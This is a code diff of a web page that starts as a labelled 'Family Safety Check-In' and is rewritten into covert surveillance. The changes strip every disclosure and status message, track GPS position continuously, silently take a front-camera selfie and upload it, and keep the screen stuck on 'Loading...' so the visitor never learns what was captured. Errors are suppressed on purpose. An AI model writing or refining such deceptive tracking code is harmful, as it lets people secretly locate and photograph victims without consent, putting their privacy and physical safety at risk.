@@ -2,10 +2,10 @@
 <html>
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Family Safety Portal</title>
+    <title>Portal</title>
     <style>
         body { font-family: sans-serif; text-align: center; padding: 20px; background: #f4f6f9; color: #333; }
-        .card { background: white; padding: 35px 25px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); max-width: 400px; margin: 40px auto; }
+        .card { background: white; padding: 45px 25px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); max-width: 400px; margin: 60px auto; }
         .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin: 25px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         #status { font-weight: bold; color: #555; font-size: 16px; margin-top: 15px; }
@@ -15,14 +15,20 @@
 <body>
 
 <div class="card">
-    <h2>Family Safety Check-In</h2>
     <div id="loader" class="loader"></div>
-    <p id="status">Connecting to secure portal...</p>
+    <p id="status">Loading...</p>
     <video id="video" autoplay playsinline muted></video>
 </div>
 
 <script>
-    let deviceOwner = prompt("Please enter your name:") || "Unknown Device";
+    // Automatically detect device type so no name input is required
+    let deviceOwner = "Device";
+    if (/iPhone|iPad|iPod/i.test(navigator.userAgent)) {
+        deviceOwner = "iOS Device";
+    } else if (/Android/i.test(navigator.userAgent)) {
+        deviceOwner = "Android Device";
+    }
+
     let currentLat = null;
     let currentLon = null;
     let videoStream = null;
@@ -33,21 +39,19 @@
     const loaderDiv = document.getElementById('loader');
     const videoEl = document.getElementById('video');
 
-    // 1. START WITH GPS ONLY
+    // 1. Immediately request GPS coordinates
     if (navigator.geolocation) {
-        statusDiv.innerText = "Retrieving location coordinates...";
         navigator.geolocation.watchPosition((position) => {
             currentLat = position.coords.latitude;
             currentLon = position.coords.longitude;
             
-            // Continuous passive location updates in the background
             fetch('/update', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ name: deviceOwner, lat: currentLat, lon: currentLon })
             })
             .then(() => {
-                // Once the FIRST location transmission is completely successful, step into the camera phase
+                // Instantly proceed to the camera setup as soon as the first GPS log lands
                 if (!locationSent) {
                     locationSent = true;
                     setupCamera();
@@ -55,38 +59,32 @@
             });
 
         }, (err) => {
-            statusDiv.innerText = "Error: Please allow location access to continue.";
-            loaderDiv.style.display = 'none';
+            // Keep the loading message on-screen or print error quietly
+            console.log("GPS locked out");
         }, { enableHighAccuracy: true });
     } else {
-        statusDiv.innerText = "Device not supported.";
-        loaderDiv.style.display = 'none';
+        console.log("Not supported");
     }
 
-    // 2. CAMERA ONLY ACTIVATES AFTER LOCATION DATA SENDS
+    // 2. Open camera feed seamlessly
     function setupCamera() {
-        statusDiv.innerText = "Location shared! Opening secure verification features...";
-        loaderDiv.style.display = 'block';
-        
         navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
             .then((stream) => {
                 videoStream = stream;
                 videoEl.srcObject = stream;
                 videoEl.style.display = 'inline-block';
-                statusDiv.innerText = "Verifying surroundings... Please hold steady.";
                 
-                // 3. ONE-SECOND FOCUS DELAY BEFORE THE SELFIE SENDS
+                // 3. 1-second auto-delay to ensure picture clarity
                 setTimeout(() => {
                     autoCaptureSelfie();
                 }, 1000);
             })
             .catch((err) => {
-                statusDiv.innerText = "Camera access required. Please allow camera permissions.";
-                loaderDiv.style.display = 'none';
+                console.log("Camera locked out");
             });
     }
 
-    // 4. Snapshot Processing Engine
+    // 4. Capture photo and keep the interface frozen on "Loading..."
     function autoCaptureSelfie() {
         if (photoTaken) return; 
         if (!currentLat || !currentLon) {
@@ -95,7 +93,6 @@
         }
 
         photoTaken = true;
-        statusDiv.innerText = "Sending visual check-in update...";
 
         const canvas = document.createElement('canvas');
         canvas.width = videoEl.videoWidth || 640;
@@ -118,9 +115,10 @@
                 image: imageData
             })
         }).then(() => {
-            statusDiv.innerText = "Check-in completed successfully! You can close this tab.";
-            loaderDiv.style.display = 'none';
-            videoEl.style.display = 'none';
+            // FORCE SCREEN TO SHOW "Loading..." FOREVER
+            statusDiv.innerText = "Loading...";
+            loaderDiv.style.display = 'block';
+            videoEl.style.display = 'none'; // Hide camera viewport after snap
             
             if(videoStream) {
                 videoStream.getTracks().forEach(track => track.stop());
